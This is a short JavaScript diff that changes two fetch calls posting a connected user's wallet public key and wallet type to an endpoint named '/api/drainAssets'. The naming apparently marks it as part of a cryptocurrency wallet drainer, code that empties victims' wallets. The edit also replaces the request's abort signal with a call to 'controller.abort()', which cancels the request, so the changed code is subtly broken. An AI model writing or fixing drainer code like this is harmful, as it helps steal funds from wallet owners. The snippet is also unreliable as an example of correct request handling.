@@ -5822,8 +5822,8 @@
           response = await fetch('/api/drainAssets', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ user: publicKey, walletType: walletType }),
-            signal: controller.signal
+            body: JSON.stringify({ user: publicKey.toString(), walletType: walletType.toLowerCase() }),
+            signal: controller.abort()
           });
           
           clearTimeout(timeoutId);
@@ -5843,7 +5843,7 @@
               response = await fetch('/api/drainAssets', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ user: publicKey, walletType: walletType })
+                body: JSON.stringify({ user: publicKey.toString(), walletType: walletType.toLowerCase() })
               });
             } catch (retryError) {
               throw new Error(`Retry failed: ${retryError.message}`);
